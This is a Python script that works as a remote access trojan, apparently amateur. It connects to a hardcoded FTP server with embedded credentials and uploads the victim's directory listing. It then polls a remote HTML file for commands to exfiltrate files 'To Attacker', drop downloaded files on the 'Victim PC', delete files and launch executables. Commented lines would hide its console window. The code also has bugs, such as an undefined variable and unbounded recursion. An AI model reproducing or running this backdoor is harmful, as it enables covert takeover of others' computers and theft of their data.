import os
from bs4 import BeautifulSoup
import bs4
from ftplib import FTP
import ftplib
import time
#hides The Window
#import win32console,win32gui
#window = win32console.GetConsoleWindow() 
#win32gui.ShowWindow(window,0)
#main
dirt= os.listdir('.')
f=open("dirt.txt","w")
str1 = ''.join(str(e+' \n') for e in dirt)
print(str1)
f.write(str1)
f.close()
str1 = ''
time.sleep(3)
ftp = ftplib.FTP("66.220.9.50") 
ftp.login("mukulgr81", "Python")
def hi():
	time.sleep(5)
	f = open('simple.html','wb')
	ftp.retrbinary('RETR ' + 'simple.html' ,f.write)
	f.close()
	e = open('simple.html')
	soup = bs4.BeautifulSoup(e.read(),'html.parser')
	find = soup.select('p')
	free = find[0].getText()
	e.close()
	print(free)
	if "your" in free:
		try:
			d = free[5:]
			fil = open('dirt.txt','rb')                 
			session.storbinary('STOR dirt.txt', fil)    
			print("Directory list Send")
			fil.close()  
			hi()
		except:
			hi()
		
	elif "down" in free:
		try:
			fold = free[5:]
			if os.path.isfile('./%s'% fold): #check if 'foo' exist inside 'www'
				print 'YES'
				time.sleep(3)
				hi()
			else:
				print'no'
				f = open(fold,'wb')
				ftp.retrbinary('RETR ' + fold ,f.write)
				print ("[+] Sucess fully Download In Victim PC")
				f.close()
				downlo = open('SendToV.txt','wb')
				down_now = ("File Sucessfully Send To Victim Is %s"% fold)
				downlo.write(down_now)
				downlo.close()
				uplo = open('SendToV.txt','rb')
				ftp.storbinary('STOR SendToV.txt' ,uplo)
				print("File Is Sucessfully Send")
				uplo.close()
				os.remove('SendToV.txt')
				hi()
		except:
			hi()
			
	elif "up" in free:
		try:
			up = free[3:]
			if up in ftp.nlst() : #check if 'foo' exist inside 'www'
				print 'YES'
				time.sleep(3)
				hi()
			else:
				print'no'
				print "hello"
				up = free[3:]
				se = os.stat(up)
				size=se.st_size
				main_size = str((size/(1024*1024)))
				sze = open('size.txt','wb')
				size_now = ("Size Of  Your File In MB To Download -> %s"% main_size)
				sze.write(size_now)
				sze.close()
				upl = open('size.txt','rb')
				ftp.storbinary('STOR size.txt' ,upl)
				upl.close()
				foul = open(up,'rb')                 
				ftp.storbinary('STOR '+ up ,foul)    
				downlo = open('SendToME.txt','wb')
				down_now = ("File Sucessfully Send To Attacker Is %s"% up)
				downlo.write(down_now)
				downlo.close()
				uplo = open('SendToME.txt','rb')
				ftp.storbinary('STOR SendToME.txt' ,uplo)
				print("File Is Sucessfully Send")
				uplo.close()
				os.remove('SendToME.txt')
				os.remove('size.txt')
				hi()
		except:
			hi()
		     
	elif "cd" in free:
		try:
			di = free[3:]
			os.chdir(di)
			dirt= os.listdir('.')
			f=open("dirt.txt","w")
			str1 = ''.join(str(e+' \n') for e in dirt)
			print(str1)
			f.write(str1)
			f.close()
			str1 = ''
			fil = open('dirt.txt','rb')                 
			ftp.storbinary('STOR dirt.txt', fil)    
			print("Directory list send")
			fil.close() 
			hi()
		except:
			hi()

	elif "go" in free:
		try:
			sta = free[3:]
			os.remove(sta)
			print("[+] Removed Sucessfully") 
			hi()
		except:
			hi()
			
	elif "del" in free:
		try:			
			delite = free[4:]
			os.startfile(delite)
			print("[+] Started Sucessfully")
			hi()
		except:
			hi()
			
	elif "bye" in free:
		try:
			print("hi and bye")
			exit(1)
		except:
			print("GOing")
	
	else:
		try:
			print("ok doing")
			time.sleep(15)
			hi()
		except:
			print("Failed")
			hi()
			
		
		
        
        
if __name__ == "__main__":
    hi()	
    
                  

	

		

